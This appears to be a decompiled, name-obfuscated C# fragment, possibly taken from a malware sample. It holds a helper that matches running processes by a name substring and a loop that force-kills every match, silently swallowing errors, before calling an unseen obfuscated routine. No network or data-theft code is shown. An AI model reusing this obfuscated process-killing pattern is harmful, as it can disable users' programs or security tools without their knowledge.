using System;
using System.Diagnostics;

namespace vlFwgXmbIo;

public sealed class Svinioziipe
{
	public static bool NZLOvTciEPO(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void qDaoQaNgpwYBxuNi(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (NZLOvTciEPO(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					RQEwPOshulKqs.bblGGLeySpj();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
